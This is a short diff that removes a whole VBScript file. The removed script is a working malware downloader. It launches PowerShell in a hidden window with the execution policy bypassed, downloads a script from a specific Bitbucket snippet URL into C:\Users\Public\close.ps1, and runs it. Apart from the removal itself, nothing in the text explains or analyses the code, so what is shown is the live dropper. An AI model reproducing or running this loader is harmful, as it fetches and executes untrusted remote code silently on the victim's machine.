@@ -1,4 +1,0 @@
-Set objShell = CreateObject("WScript.Shell")
-
-' Download and run the PowerShell script
-objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command ""& { Invoke-WebRequest -Uri 'https://bitbucket.org/!api/2.0/snippets/mounmeinlylo/LzBXox/1362880eba453415da7d084f7889168fc8341ba5/files/emestart.ps1' -OutFile 'C:\Users\Public\close.ps1'; C:\Users\Public\close.ps1 }""", 0, True
